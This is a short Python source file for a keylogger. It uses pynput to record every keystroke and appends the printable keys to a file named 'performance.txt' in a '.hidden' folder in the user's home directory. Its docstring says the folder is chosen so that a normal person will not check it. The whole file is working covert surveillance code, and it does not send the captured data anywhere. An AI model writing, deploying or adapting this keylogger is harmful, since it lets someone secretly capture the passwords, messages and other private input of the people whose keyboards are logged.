import os;
import sys;
from typing import *;
from pynput.keyboard import Listener, Key;

HOMEPATH: str = ""
KEYS: List[Key] = []
COUNT: int = 0

def main():
    with Listener(on_press=keyPress) as listener:
        listener.join()

def keyPress(key: Key) -> None:
    global KEYS, COUNT
    KEYS.append(key)
    COUNT += 1
    if COUNT >= 1:
        COUNT = 0
        writeKey(KEYS);

def writeKey(keys: List[Key]) -> None:
    """ 
    This will write keys to a file that is created
    but checking what OS we are on to create the file accordingly
    the plan is to create the file in a folder that a normal
    person will not check in
    """
    global HOMEPATH
    if os.name == "posix": # We are on a linux system or Mac
        HOMEPATH = "/home/"
        try:
            username = os.getlogin() # We will try to get their username
            path: str = searchFile(HOMEPATH + username + "/", ".hidden") # We will look for .config folder
            if (path is None): # .config was not found then we will make one
                try:
                    os.makedirs(HOMEPATH + username + "/.hidden")
                    path = HOMEPATH + username + "/.hidden"
                except OSError as e:
                    print(f"Failed to create folder: {e}")
                    sys.exit(1)
            with open(path + "/performance.txt", "a") as keyFile:
                for key in keys:
                    k = str(key).replace("'", "") # Replace quotes that come with keys
                    if k.find("Key") == -1: # Check if it is a special key
                        keyFile.write(k)
        except Exception:
            sys.exit(1)

def searchFile(start: str, target: str) -> Union[str, None]:
    for root, dir, file in os.walk(start):
        if target in file or target in dir:
            return os.path.join(root, target)
    return None

if __name__ == "__main__":
    main()